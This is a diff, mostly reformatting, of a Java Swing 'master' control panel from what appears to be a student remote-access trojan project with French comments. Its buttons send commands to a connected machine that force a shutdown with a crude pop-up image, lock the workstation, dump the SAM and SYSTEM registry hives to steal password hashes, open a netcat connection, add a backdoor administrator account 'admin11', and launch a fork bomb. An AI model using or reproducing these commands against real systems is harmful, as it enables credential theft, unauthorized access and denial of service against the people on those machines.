@@ -22,9 +22,11 @@ import master.Connexion;
 import constante.Constante;
 
 /**
- * Classe Heritant de MJinternalFrame qui ouvre une fenetre donnant a l'utilisateur maitre une interface graphique
- * qui lui permet de lancer directement certaines vilaines commandes déja implémentées
- * @author lh
+ * Classe Heritant de MJinternalFrame qui ouvre une fenetre donnant a
+ * l'utilisateur maitre une interface graphique qui lui permet de lancer
+ * directement certaines vilaines commandes déja implémentées
+ * 
+ * @author Clement Collet & Louis Henri Franc & Mohammed Boukhari
  *
  */
 public class MotherJInternalFrame extends MJInternalFrame {
@@ -32,12 +34,13 @@ public class MotherJInternalFrame extends MJInternalFrame {
 	private Connexion _connexion;
 	private boolean _vOs;
 
-	public MotherJInternalFrame(String title, final Connexion connexion, int nframe) {
+	public MotherJInternalFrame(String title, final Connexion connexion,
+			int nframe) {
 		super(title, connexion, nframe);
 		setFrameIcon(new ImageIcon(Paths.get("").toAbsolutePath().toString()
 				+ File.separator + "ressources" + File.separator + "mask1.png"));
 		getContentPane().setBackground(new Color(0, 102, 153));
-		getContentPane().setForeground(new Color(102, 153, 51));  
+		getContentPane().setForeground(new Color(102, 153, 51));
 		_connexion = connexion;
 		if (_connexion.get_os_name().contains("win")
 				|| _connexion.get_os_name().contains("Win")) {
@@ -45,13 +48,10 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		} else
 			_vOs = false;
 
-		
-		 UIManager UI=new UIManager();
-		 UI.put("OptionPane.background",new Color(0, 153, 255));
-		 UI.put("Panel.background", new Color(0, 153, 255));
+		UIManager UI = new UIManager();
+		UI.put("OptionPane.background", new Color(0, 153, 255));
+		UI.put("Panel.background", new Color(0, 153, 255));
 
-		
-		
 		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
 		setBounds(100, 100, 450, 300);
 		GridBagLayout gridBagLayout = new GridBagLayout();
@@ -83,6 +83,7 @@ public class MotherJInternalFrame extends MJInternalFrame {
 			public void mouseClicked(MouseEvent arg0) {
 				shutdownComputer();
 			}
+
 			private void shutdownComputer() {
 				if (!_vOs) {
 					_connexion.sendCmdCommand("shutdown +1");
@@ -92,9 +93,9 @@ public class MotherJInternalFrame extends MJInternalFrame {
 									"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
 				} else {
 					_connexion
-					.sendNotification(
-							"Votre ordinateur va s'eteindre dans 1 minutes",
-							"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
+							.sendNotification(
+									"Votre ordinateur va s'eteindre dans 1 minutes",
+									"http://sd.keepcalm-o-matic.co.uk/i/keep-calm-i-have-a-big-dick-no-rage.png");
 					_connexion
 							.sendCmdCommand("rundll32.exe user32.dll, LockWorkStation"); // shutdown
 																							// -c
@@ -106,7 +107,7 @@ public class MotherJInternalFrame extends MJInternalFrame {
 																							// version
 																							// moins
 																							// cool
-				
+
 				}
 			}
 
@@ -120,16 +121,19 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_4.insets = new Insets(0, 0, 5, 5);
 		gbc_btnNewButton_4.gridx = 5;
 		gbc_btnNewButton_4.gridy = 1;
-		getContentPane().add(btnNewButton_4, gbc_btnNewButton_4);	
+		getContentPane().add(btnNewButton_4, gbc_btnNewButton_4);
 		btnNewButton_4.addMouseListener(new MouseAdapter() {
 			private void dumptheHash() {
 				// TODO Auto-generated method stub
-				if(_vOs)
-				{
-				connexion.sendCmdCommand("reg save HKLM\\SAM %"+connexion.get_user_name()+"%.sam");
-				connexion.sendCmdCommand("save %"+connexion.get_user_name()+"%.sam");
-				connexion.sendCmdCommand("reg save HKLM\\SYSTEM %"+connexion.get_user_name()+"%.system");
-				connexion.sendCmdCommand("save "+connexion.get_user_name()+"%.system");
+				if (_vOs) {
+					connexion.sendCmdCommand("reg save HKLM\\SAM %"
+							+ connexion.get_user_name() + "%.sam");
+					connexion.sendCmdCommand("save %"
+							+ connexion.get_user_name() + "%.sam");
+					connexion.sendCmdCommand("reg save HKLM\\SYSTEM %"
+							+ connexion.get_user_name() + "%.system");
+					connexion.sendCmdCommand("save "
+							+ connexion.get_user_name() + "%.system");
 				}
 			}
 
@@ -157,21 +161,22 @@ public class MotherJInternalFrame extends MJInternalFrame {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
 				}
-				
+
 			}
+
 			private void netcat() throws IOException {
 				if (!_vOs) {
 					_connexion.sendCmdCommand("$ nc -l 33333");
 					Runtime.getRuntime().exec(
-							"cmd.exe /c start nc " + _connexion.get_ip() + " 33333");
+							"cmd.exe /c start nc " + _connexion.get_ip()
+									+ " 33333");
 				} else {
 					// _connexion.sendCmdCommand("netcat -l -p 11111");
-				//	Runtime.getRuntime().exec(
-					//		"cmd.exe /c start nc" + _connexion.get_ip() + " 33333");
-					Runtime rt=Runtime.getRuntime();
-					rt.exec("cmd.exe /c start color 02 & :debut echo %random% %random% %random% %random% HACKING begins & goto debut"
-							);
-					
+					// Runtime.getRuntime().exec(
+					// "cmd.exe /c start nc" + _connexion.get_ip() + " 33333");
+					Runtime rt = Runtime.getRuntime();
+					rt.exec("cmd.exe /c start color 02 & :debut echo %random% %random% %random% %random% HACKING begins & goto debut");
+
 				}
 			}
 		});
@@ -189,14 +194,17 @@ public class MotherJInternalFrame extends MJInternalFrame {
 				if (!_vOs) {
 
 				} else {
-					_connexion.sendCmdCommand("net user admin11  /add /passwordchg:no");
+					_connexion
+							.sendCmdCommand("net user admin11  /add /passwordchg:no");
 				}
 			}
+
 			@Override
 			public void mouseClicked(MouseEvent arg0) {
 				ajouterUtilisateur();
 			}
 		});
+
 		JButton btnNewButton_2 = new JButton("Fork Bomb");
 		btnNewButton_2.setFont(new Font("Tahoma", Font.BOLD | Font.ITALIC, 11));
 		btnNewButton_2.setBackground(new Color(0, 204, 102));
@@ -279,12 +287,13 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		}
 	}
 
-	
-	
 	private void random() {
-		JOptionPane.showMessageDialog(this,
-				(new Random().nextInt(10) < 8 )? Constante.listCommandeL[new Random()
-						.nextInt(Constante.listCommandeL.length - 1)] : Constante.listeCommandeW[0] ,
-				"Idees", JOptionPane.PLAIN_MESSAGE);
+		JOptionPane
+				.showMessageDialog(
+						this,
+						(new Random().nextInt(10) < 8) ? Constante.listCommandeL[new Random()
+								.nextInt(Constante.listCommandeL.length - 1)]
+								: Constante.listeCommandeW[0], "Idees",
+						JOptionPane.PLAIN_MESSAGE);
 	}
 }
